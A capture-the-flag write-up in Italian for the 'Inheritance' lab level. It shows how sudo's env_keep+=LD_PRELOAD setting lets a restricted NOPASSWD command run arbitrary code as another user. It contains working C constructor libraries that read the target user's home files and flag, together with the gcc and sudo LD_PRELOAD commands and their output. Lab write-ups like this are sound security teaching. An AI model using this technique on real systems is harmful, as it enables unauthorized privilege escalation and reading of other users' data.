```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x03 · "inheritance"
 ========================================================================

   target ..: phantom-03  "Inheritance"
   class ...: privesc / sudo env_keep · LD_PRELOAD
   tools ...: sudo -l · gcc · shared lib constructor
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> sudo ti lascia lanciare un solo comando innocuo (`id`) come un altro
> utente. ma è severo sul comando, non su tutto ciò che eredita dalla
> shell: `env_keep+=LD_PRELOAD` è la porta lasciata aperta.

## ----[ 0x00 · intel ]----

Dal brief:

```text
MISSION: Inheritance
====================

You can run one harmless command as another user. Sudo is strict
about which command you may run — but not about everything it
inherits from your shell when it starts.

Figure out what sudo is letting through, and carry something
dangerous in with it. A C compiler is present on this box.

FLAG: owned by the user sudo lets you impersonate — not root.
```

Obiettivo: sudo permette `/usr/bin/id` come `flagkeeper3`. Bisogna capire
cosa sudo lascia passare dall'ambiente per trasformare quel comando
innocuo in esecuzione di codice arbitrario come `flagkeeper3`.

## ----[ 0x01 · recon ]----

Home: solo dotfile e `BRIEFING`. Permessi sudo:

```bash
sudo -l
Matching Defaults entries for phantom3 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LD_PRELOAD

User phantom3 may run the following commands on phantom:
    (flagkeeper3) NOPASSWD: /usr/bin/id
```

Due dettagli:

1. `phantom3` può eseguire `/usr/bin/id` come `flagkeeper3`, senza
   password.
2. Nei `Defaults`, accanto a `env_reset` (che di norma ripulisce
   l'ambiente), c'è `env_keep+=LD_PRELOAD`: sudo **preserva**
   esplicitamente `LD_PRELOAD` invece di scartarla.

## ----[ 0x02 · il difetto ]----

`LD_PRELOAD` dice al linker dinamico quale shared library caricare prima
di tutte le altre. Se una libreria ha un `__attribute__((constructor))`,
il suo codice gira automaticamente al caricamento — prima ancora della
`main()` del target.

Di norma sudo, con `env_reset`, azzera l'ambiente del figlio proprio per
prevenire questo abuso. Ma `env_keep+=LD_PRELOAD` la **whitelista**
esplicitamente, mantenendola anche per un comando NOPASSWD ristretto come
`/usr/bin/id`.

Conseguenza: si compila una shared library con constructor, la si passa
via `LD_PRELOAD` a `sudo … /usr/bin/id`, e il linker la carica nel
processo `id` eseguito come `flagkeeper3`. Il constructor gira con quei
privilegi, a prescindere da cosa faccia `id`. Il binario NOPASSWD è solo
il veicolo: l'esecuzione arbitraria avviene nel constructor.

## ----[ 0x03 · exploit ]----

1. Primo sorgente C: constructor che enumera e legge la home di
   `flagkeeper3`, per capire cosa contiene:

```c
#include <stdio.h>
#include <dirent.h>
#include <string.h>

void list_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", path, entry->d_name);
        printf("[%s] %s\n", entry->d_type == 4 ? "DIR" : "FILE", full);
        if (entry->d_type == 4)
            list_dir(full);
    }
    closedir(d);
}

void read_file(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return;
    printf("\n=== %s ===\n", path);
    char buf[4096];
    while (fgets(buf, sizeof(buf), f))
        printf("%s", buf);
    fclose(f);
}

__attribute__((constructor))
void pwn() {
    list_dir("/home/flagkeeper3");
    read_file("/home/flagkeeper3/.bash_history");
    read_file("/home/flagkeeper3/.viminfo");
    read_file("/home/flagkeeper3/.profile");
}
```

2. Compilazione come shared library ed esecuzione via sudo, con
   `LD_PRELOAD` preservato da `env_keep`:

```bash
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
```

Il constructor gira come `flagkeeper3` e legge la sua home. Dal
`.bash_history` esfiltrato (output di recon, non la soluzione) emerge che
l'operatore aveva già fatto `cat /var/lib/phantom-flags/level3_flag`,
rivelando il percorso esatto della flag.

3. Riscrittura del sorgente per puntare dritto al file flag:

```c
#include <stdio.h>

__attribute__((constructor))
void pwn() {
    FILE *f = fopen("/var/lib/phantom-flags/level3_flag", "r");
    if (f) {
        char buf[4096];
        while (fgets(buf, sizeof(buf), f))
            printf("%s", buf);
        fclose(f);
    }
}
```

4. Ricompilazione ed esecuzione finale:

```bash
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
```

```
<REDACTED_FLAG>
uid=1012(flagkeeper3) gid=1012(flagkeeper3) groups=1012(flagkeeper3)
```

La prima riga è la flag stampata dal constructor al caricamento; la
seconda è l'output normale di `id` come `flagkeeper3`, a conferma che
tutto il processo gira coi privilegi impersonati.

## ----[ 0x04 · loot ]----

`env_keep+=LD_PRELOAD` + un NOPASSWD innocuo (`/usr/bin/id` come
`flagkeeper3`) = injection di una shared library con constructor ed
esecuzione arbitraria come `flagkeeper3`, flag inclusa (valore fuori dal
writeup). Lezione: sudo può blindare il comando, ma se ti lascia ereditare
`LD_PRELOAD` il comando non conta più.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
